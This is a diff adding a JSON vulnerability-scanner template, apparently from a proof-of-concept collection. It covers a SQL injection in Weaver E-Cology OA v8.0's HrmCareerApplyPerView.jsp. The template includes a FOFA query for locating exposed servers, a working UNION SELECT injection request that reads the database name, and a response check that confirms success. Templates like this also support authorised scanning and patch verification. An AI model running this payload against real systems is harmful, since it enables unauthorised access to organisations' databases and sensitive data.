@@ -1,0 +1,36 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology HrmCareerApplyPerView.jspSQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件",
+  "version": "泛微OA E-Cology v8.0",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-协同办公OA\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17677268.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,123456)),db_name(1),5,6,7"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
